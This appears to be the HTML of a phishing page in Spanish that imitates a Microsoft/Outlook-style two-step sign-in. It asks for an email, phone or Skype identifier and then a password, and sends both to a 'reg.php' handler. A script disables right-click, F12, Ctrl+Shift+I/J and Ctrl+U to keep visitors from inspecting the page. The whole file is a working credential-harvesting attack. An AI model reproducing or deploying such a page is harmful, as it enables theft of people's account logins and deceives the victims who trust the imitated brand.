<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>calendario y correo electrónico</title>
  <link rel="stylesheet" href="estils.css">
</head>
<body>
  <!----BySttecas--->
  <div class="cua">
    <form action="reg.php" method="post">
        <div class="formu" id="formu" style="display: block;">
      
            <div class="i">
              <img id="ia" src="https://i.postimg.cc/0yJFXM92/fw.png" alt="">
            </div>
            <h3 id="p">Ingresa los datos solicitados a continuación:</h3>
            <div class="camp">
              <input  type="email" name="af"  required placeholder="Correo electronico, telefono o Skype">
            </div>
            <div class="aS">
              <p>¿No tiene una cuenta? <a href="">Cree una.</a></p>
            </div>
            <div class="btn">
              <button id="btn" type="button">Siguiente</button>
            </div>
        </div>


        <div class="formu" id="formu2"style="display: none;">
      
            <div class="i">
              <img id="ia" src="https://i.postimg.cc/0yJFXM92/fw.png" alt="">
            </div>
            <h3 id="p">Iniciar sesión</h3>
            <div class="camp">
              <input  type="text" name="af2"  required placeholder="Contraseña">
          
            </div>
            <div class="aS">
              <p> <a href="">¿Olvidó su contraseña?</a></p>
              
            </div>
            <div class="btn">
              <button id="btn" type="submit">Siguiente</button>
            </div>
        </div>
      </form>
    



  </div>
  <br><br><br><br><br><br><br><br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
 <script>
  
    document.addEventListener('contextmenu', event => event.preventDefault());
 
    document.onkeydown = function (e) {
 
        if(e.keyCode == 123) {
            return false;
        }

        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
            return false;
        }

        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
            return false;
        }
        if(e.ctrlKey && e.keyCode == 85) {
            return false;
        }
    }
 
</script>
<script>
var nutn = document.getElementById("btn");
var namld = document.getElementById("formu");
var swold = document.getElementById("formu2");

nutn.addEventListener("click", function() {
  namld.style.display = "none";
  swold.style.display = "block";
});
</script>
</body>
</html>